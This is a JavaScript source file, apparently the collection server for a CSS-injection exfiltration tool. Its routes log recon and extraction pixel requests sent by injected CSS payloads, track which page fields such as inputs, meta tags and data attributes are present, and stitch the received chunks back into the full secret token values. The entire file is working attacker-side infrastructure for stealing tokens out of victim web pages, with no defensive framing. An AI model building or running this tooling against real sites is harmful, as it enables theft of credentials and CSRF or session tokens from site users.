'use strict';

// Server side of blind mode (see public/blind.js for the payloads).
//
//   GET  /r/<kind>/<name>     recon hit
//   GET  /api/recon           fields discovered by the last recon burst
//   POST /api/blind           choose fields to extract: { fields: [...] }
//   GET  /b/<id>/...          extract hits, namespaced by field id
//                             (/b/<id>/c/<pair> for non-hex case pairs)
//   GET  /api/blind/tokens    per-field results of the last extract burst
//   POST /api/blind/one-shot  configure shared lanes for one injection
//   GET  /api/blind/reset
//
// Bursts work like the targeted mode's: a quiet gap of settleMs ends one, and
// results are only computed after it so a poll can't lock in partial data.

const {
  RECON_KINDS, FIELD_KINDS, INPUT_NAMES, META_NAMES, URL_PARAMS, DATA_ATTRS, TARGETS, ONE_SHOT_CHARSET,
  oneShotFields, fieldsFromRecon, assignHosts,
} = require('../public/blind');
const { ANCHOR_LENGTH, CHARSETS, charsetOf, charsetName, windowSizeFor } = require('../public/payload');
const { stitchCharset, UNKNOWN_LENGTH_BUDGET } = require('./stitch');
const { chunkRoute, validChunk } = require('./chunks');

const G = '\x1b[32m';
const Y = '\x1b[33m';
const D = '\x1b[2m';
const B = '\x1b[1m';
const X = '\x1b[0m';

const MAX_FIELDS = 8;

// Which names and hosts each kind of field may use, derived from the single
// source of truth in public/blind.js (wordlists are wrapped as Sets here).
const KINDS = Object.fromEntries(
  Object.entries(FIELD_KINDS).map(([kind, def]) => [kind, { ...def, names: new Set(def.names) }]),
);
const RECON_NAMES = Object.fromEntries(
  Object.entries(RECON_KINDS).map(([kind, names]) => [kind, new Set(names)]),
);

function validField(f) {
  const kind = KINDS[f && f.kind];
  // Recon reports null (URL params) or false (no charset matched) when it
  // can't tell; those extract as hex.
  const charsetOk = f && (f.charset == null || f.charset === false ||
    (typeof f.charset === 'string' && Object.hasOwn(CHARSETS, f.charset)));
  return Boolean(kind && kind.names.has(f.name) && kind.hosts.includes(f.host) && charsetOk);
}

function mountBlind(app, { settleMs, pixel, log = console.log }) {
  const recon = { hits: new Set(), lastAt: 0 };
  // Field ids keep counting across configurations so every extract payload
  // uses fresh URLs: a browser won't re-request an image URL it already
  // loaded in the same page, e.g. when trying 3- then 4-char windows.
  let nextId = 0;
  let fields = new Map();
  let extract = emptyExtract();
  let oneShot = false;

  function emptyExtract() {
    return { states: new Map(), lastAt: 0, hits: 0, dirty: true, cached: null };
  }

  app.get('/r/:kind/:name', (req, res, next) => {
    const { kind, name } = req.params;
    if (!RECON_NAMES[kind] || !RECON_NAMES[kind].has(name)) return next();
    const now = Date.now();
    if (!oneShot && now - recon.lastAt > settleMs) {
      recon.hits = new Set();
      log(`\n${G}--- new recon ---${X}`);
    }
    const key = `${kind}/${name}`;
    if (!recon.hits.has(key)) log(`${D}recon:${X} ${key}`);
    recon.hits.add(key);
    recon.lastAt = now;
    if (oneShot) extract.dirty = true;
    res.type('gif').send(pixel);
  });

  app.get('/api/recon', (req, res) => {
    if (!recon.hits.size) return res.json({ status: 'waiting' });
    if (Date.now() - recon.lastAt < settleMs) return res.json({ status: 'partial', hits: recon.hits.size });
    const { fields: found, unlistedInputs } = fieldsFromRecon(recon.hits);
    res.json({ status: 'ok', fields: found, unlistedInputs });
  });

  app.post('/api/blind', (req, res) => {
    const wanted = Array.isArray(req.body && req.body.fields) ? req.body.fields : [];
    if (!wanted.length || wanted.length > MAX_FIELDS || !wanted.every(validField)) {
      return res.status(400).json({ error: `choose 1-${MAX_FIELDS} fields found by recon` });
    }
    const assigned = assignHosts(wanted.map((f, i) => {
      const charset = charsetName(f.charset);
      return {
        id: nextId + i,
        kind: f.kind,
        name: f.name,
        host: f.host,
        charset,
        windowSize: windowSizeFor(charset, f.windowSize),
      };
    }));
    if (assigned.error) return res.status(400).json({ error: assigned.error });
    nextId += wanted.length;
    oneShot = false;
    fields = new Map(assigned.fields.map(f => [f.id, f]));
    extract = emptyExtract();
    log(`\n${G}${B}blind extract configured${X}`);
    for (const f of assigned.fields) {
      log(`${D}#${f.id} ${f.kind} ${f.name} (host ${f.host}, ${f.charset}, ${f.windowSize}-char)${X}`);
    }
    res.json({ fields: assigned.fields });
  });

  app.post('/api/blind/one-shot', (req, res) => {
    const cfg = req.body || {};
    const targets = cfg.targets;
    const dataNames = cfg.dataNames;
    const validNames = (names, wordlist, selected) => names === undefined ||
      (Array.isArray(names) && (!selected || names.length > 0) && names.length <= 8 &&
        new Set(names).size === names.length && names.every(name => wordlist.includes(name)));
    if (!Array.isArray(targets) || !targets.length || targets.some(t => !TARGETS.includes(t)) ||
      new Set(targets).size !== targets.length ||
      !validNames(cfg.inputNames, INPUT_NAMES, targets.includes('input')) ||
      !validNames(cfg.metaNames, META_NAMES, targets.includes('meta')) ||
      !validNames(cfg.urlNames, URL_PARAMS, targets.includes('url')) ||
      !Array.isArray(dataNames) || dataNames.length > 8 ||
      (targets.includes('data') && !dataNames.length) ||
      new Set(dataNames).size !== dataNames.length || dataNames.some(n => !DATA_ATTRS.includes(n)) ||
      (cfg.urlKinds !== undefined && (!Array.isArray(cfg.urlKinds) || !cfg.urlKinds.length ||
        new Set(cfg.urlKinds).size !== cfg.urlKinds.length || cfg.urlKinds.some(k => !['a', 'form'].includes(k)))) ||
      !Object.hasOwn(CHARSETS, cfg.urlCharset) || ![3, 4].includes(cfg.urlWindow)) {
      return res.status(400).json({ error: 'invalid one-shot options' });
    }
    const lanes = oneShotFields(cfg, nextId);
    nextId += lanes.length;
    fields = new Map(lanes.map(f => [f.id, f]));
    oneShot = true;
    recon.hits = new Set();
    recon.lastAt = 0;
    extract = emptyExtract();
    res.json({ fields: lanes });
  });

  function record(fid, type, chunk, res, next) {
    const field = fields.get(Number(fid));
    if (!field) return next();
    const length = type === 'm' ? field.windowSize : type === 'c' ? 2 : ANCHOR_LENGTH;
    if (!validChunk(field.charset === 'auto' ? ONE_SHOT_CHARSET : field.charset, type, chunk, length)) return next();
    const now = Date.now();
    if (!oneShot && now - extract.lastAt > settleMs) {
      extract = emptyExtract();
      log(`\n${G}--- new blind extraction ---${X}`);
    }
    if (!extract.states.has(field.id)) {
      extract.states.set(field.id, { s: new Set(), e: new Set(), r: new Set(), m: new Set(), c: new Set() });
    }
    extract.states.get(field.id)[type].add(chunk);
    extract.hits++;
    extract.lastAt = now;
    extract.dirty = true;
    res.type('gif').send(pixel);
  }

  // Chunk-like paths only; record() checks them against the field's charset.
  for (const t of ['s', 'e', 'r', 'c']) {
    app.get(`/b/:fid(\\d+)/${t}/:c(${chunkRoute(2, 2)})`, (req, res, next) =>
      record(req.params.fid, t, req.params.c, res, next));
  }
  app.get(`/b/:fid(\\d+)/:c(${chunkRoute(3, 4)})`, (req, res, next) =>
    record(req.params.fid, 'm', req.params.c, res, next));

  app.get('/api/blind/tokens', (req, res) => {
    if (!extract.hits && !(oneShot && recon.hits.size)) return res.json({ status: 'waiting' });
    if (Date.now() - Math.max(extract.lastAt, oneShot ? recon.lastAt : 0) < settleMs) {
      return res.json({ status: 'partial', hits: extract.hits + (oneShot ? recon.hits.size : 0) });
    }
    if (!extract.dirty && extract.cached) return res.json(extract.cached);

    // The solver runs synchronously in this handler, so the whole poll shares
    // one step budget: 8 fields each spending the full per-call budget would
    // block the event loop for seconds. Fields are solved in order until the
    // budget runs out; later ones then get a best-effort small slice.
    let budgetLeft = UNKNOWN_LENGTH_BUDGET;
    const discovered = oneShot ? fieldsFromRecon(recon.hits).fields : [];
    const results = [...fields.values()].map(field => {
      const marker = { input: 'iv', meta: 'mv', data: 'dv' }[field.kind];
      const matches = oneShot ? discovered.filter(f => field.names.includes(f.name) && f.kind === field.kind &&
        (!marker || recon.hits.has(`${marker}/${f.name}`))) : [];
      const found = matches[0];
      const st = extract.states.get(field.id);
      const out = { id: field.id, kind: field.kind, name: found?.name || field.name || 'wordlist' };
      if (oneShot && matches.length > 1) {
        return { ...out, status: 'ambiguous_field', names: matches.map(f => f.name) };
      }
      if (oneShot && !found) return { ...out, status: 'none' };
      const charset = field.charset === 'auto' ? found.charset : field.charset;
      if (oneShot && !charset) return { ...out, status: 'unsupported' };
      if (!st) return { ...out, status: 'none' };
      const stats = {};
      const result = stitchCharset({
        starts: [...st.s],
        ends: [...st.e],
        runStarts: [...st.r],
        chunks: [...st.m],
        pairs: [...st.c],
      }, {
        charset: charsetOf(charset),
        unknownLength: true,
        windowSize: field.windowSize,
        whole: KINDS[field.kind].whole,
        budget: Math.max(1, budgetLeft),
        stats,
      });
      budgetLeft -= stats.spent || 0;
      if (!result) {
        log(`${Y}#${field.id} ${out.name}: no ${charset} token recovered${X}`);
        return { ...out, status: 'failed', charset, chunks: st.m.size };
      }
      if (result.candidates) {
        const more = result.truncated ? '+' : '';
        log(`\n${Y}${B}#${field.id} ${out.name}: ambiguous (${result.candidates.length}${more} candidates):${X}`);
        result.candidates.forEach(c => log(`  ${c}`));
      } else {
        log(`\n${G}${B}#${field.id} ${out.name} (${result.length} chars):${X} ${result.token}`);
      }
      if (result.caseUnresolved) log(`${Y}#${field.id} ${out.name}: letter case not recovered${X}`);
      return {
        ...out,
        status: 'ok',
        token: result.token,
        length: result.length,
        candidates: result.candidates,
        truncated: result.truncated,
        caseUnresolved: result.caseUnresolved,
      };
    });
    extract.cached = { status: 'ok', results };
    extract.dirty = false;
    res.json(extract.cached);
  });

  app.get('/api/blind/reset', (req, res) => {
    recon.hits = new Set();
    recon.lastAt = 0;
    // Drop the field configs too, so CSS still firing /b/<oldid>/... from a
    // previous extraction can't record into (and resurrect) a fresh one.
    fields = new Map();
    oneShot = false;
    extract = emptyExtract();
    log(`${D}blind state reset${X}`);
    res.json({ status: 'ok' });
  });
}

module.exports = { mountBlind, validField };
